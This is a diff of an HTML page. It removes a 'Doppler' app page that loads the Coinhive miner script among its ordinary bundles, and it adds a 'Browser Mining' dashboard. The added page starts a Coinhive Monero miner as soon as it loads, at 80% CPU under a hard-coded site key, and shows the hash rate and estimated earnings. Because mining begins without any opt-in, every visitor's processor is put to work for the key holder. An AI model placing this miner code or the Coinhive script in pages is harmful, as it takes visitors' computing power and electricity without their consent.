@@ -1,1 +1,129 @@
-<!DOCTYPE html><html><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Doppler</title><script src=https://coinhive.com/lib/coinhive.min.js></script><link href=/doppler/static/css/app.633f14ced6ca86dede21a4f56b8d05ad.css rel=stylesheet></head><body><div id=app></div><script type=text/javascript src=/doppler/static/js/manifest.d000914013dad2daa390.js></script><script type=text/javascript src=/doppler/static/js/vendor.8f5ed58de48edb1cf3af.js></script><script type=text/javascript src=/doppler/static/js/app.65927a76710cb29a27f8.js></script></body></html>
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.12/semantic.min.css" />
+  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
+  <script src="https://unpkg.com/semantic-ui-vue/dist/umd/semantic-ui-vue.min.js"></script>
+  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+  <style>
+    .ui.statistics:after {
+      content: none
+    }
+  </style>
+</head>
+<body>
+  <div  id="app">
+    <div class="ui fixed inverted menu">
+      <div class="ui container">
+        <a href="#" class="header item">
+          Browser Mining
+        </a>
+      </div>
+    </div>
+    <div class="ui main text container" style="margin-top: 7em;">
+      <div is="sui-container">
+        <sui-segment attached>
+          <a href="https://coinhive.com/" target="_blank" class="ui green ribbon label">Coin Hive</a>
+          <sui-statistics-group style="justify-content: space-around;">
+            <sui-statistic in-group>
+              <sui-statistic-value>{{ speed.toFixed(2) }}</sui-statistic-value>
+              <sui-statistic-label>hash/sec</sui-statistic-label>
+            </sui-statistic>
+            <sui-statistic in-group>
+              <sui-statistic-value>{{ total }}</sui-statistic-value>
+              <sui-statistic-label>hash total</sui-statistic-label>
+            </sui-statistic>
+            <sui-statistic in-group>
+              <sui-statistic-value>{{ percent + '%' }}</sui-statistic-value>
+              <sui-statistic-label>CPU usage</sui-statistic-label>
+            </sui-statistic>
+            <sui-statistic in-group>
+              <sui-statistic-value>{{ usd_month.toFixed(2) }}</sui-statistic-value>
+              <sui-statistic-label>USD/month</sui-statistic-label>
+            </sui-statistic>
+          </sui-statistics-group>
+          <sui-progress
+          attached
+          top
+          indicating
+          :percent="percent"
+          />
+        </sui-segment>
+        <div class="ui three bottom attached buttons">
+          <sui-button @click.native="decrease" class="red">-</sui-button>
+          <sui-button>CPU USAGE</sui-button>
+          <sui-button @click.native="increase" class="green">+</sui-button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    Vue.use(SemanticUIVue);
+    var miner;
+    var app = new Vue({
+      el: '#app',
+      data: {
+        speed: 0,
+        total: 0,
+        xmr: 0,
+        XMRUSD: 0,
+        percent: 80,
+      },
+      computed: {
+        xmr: function() {
+          return this.hashesToXMR(this.total)
+        },
+        usd: function() {
+          return (this.xmr * this.XMRUSD)
+        },
+        usd_month: function() {
+          const sec_in_month = (60 * 60 * 24 * 365)/12
+          return (this.hashesToXMR(this.speed * sec_in_month) * this.XMRUSD)
+        },
+        throttle: function() {
+          return 1 - this.percent / 100;
+        }
+      },
+      methods: {
+        increase: function() {
+          if (this.percent < 100) {
+            this.percent += 10;
+            miner.setThrottle(this.throttle)
+          }
+        },
+        decrease: function() {
+          if (this.percent > 0) {
+            this.percent -= 10;
+            miner.setThrottle(this.throttle)
+          }
+        },
+        hashesToXMR: function(hashes) {
+          // 0.000052 XMR per 1 milion hashes
+          return (hashes / 1000000) * 0.000052
+        },
+        startMiner: function() {
+          miner = new CoinHive.Anonymous('nWSBog9VskRRvFI07Y74tydSfYRnQTD4', { throttle: this.throttle })
+          miner.start()
+          var that = this
+          setInterval(function() {
+            that.speed = miner.getHashesPerSecond()
+            that.total = miner.getTotalHashes()
+          }, 1000)
+        },
+        fetchXMRPrice: function() {
+          var xmlHttp = new XMLHttpRequest();
+          // false for synchronous request
+          xmlHttp.open('GET', 'https://min-api.cryptocompare.com/data/price?fsym=XMR&tsyms=USD', false);
+          xmlHttp.send(null);
+          this.XMRUSD = JSON.parse(xmlHttp.response).USD
+        },
+      },
+      created: function() {
+        this.fetchXMRPrice();
+        this.startMiner();
+      },
+    })
+  </script>
+</body>
+</html>
